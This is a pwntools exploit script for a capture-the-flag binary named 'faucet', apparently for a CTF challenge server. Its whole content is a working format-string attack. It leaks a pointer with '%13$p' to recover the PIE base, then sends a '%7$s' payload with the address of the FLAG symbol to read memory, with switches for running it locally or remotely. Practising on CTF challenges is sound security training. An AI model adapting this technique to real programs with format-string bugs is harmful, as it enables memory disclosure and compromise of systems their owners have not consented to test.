#!/usr/bin/python

from pwn import *

PATH = './faucet'

GDBSCRIPT = '''

'''

HOST = 'challenge.ctf.games'
PORT = 31428

def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/peda/peda.py'"])
        # gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source ~/.gdbinit_pwndbg'"])

def buy(item):
    r.sendlineafter('> ', '5')
    r.sendlineafter(': ', item)
    return r.recvline(0).split()[-1]

def exploit(r):
    
    elf.address = int(buy(f'%13$p'), 16) - 0x1725

    info(hex(elf.address))

    payload = b'%7$s____' + p64(elf.sym['FLAG'])
    print(buy(payload))

    # debug(GDBSCRIPT)

    r.interactive()

if __name__ == '__main__':
    elf  = ELF(PATH)
    # libc = ELF(elf.libc.path)

    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process(PATH, aslr=0)
    exploit(r)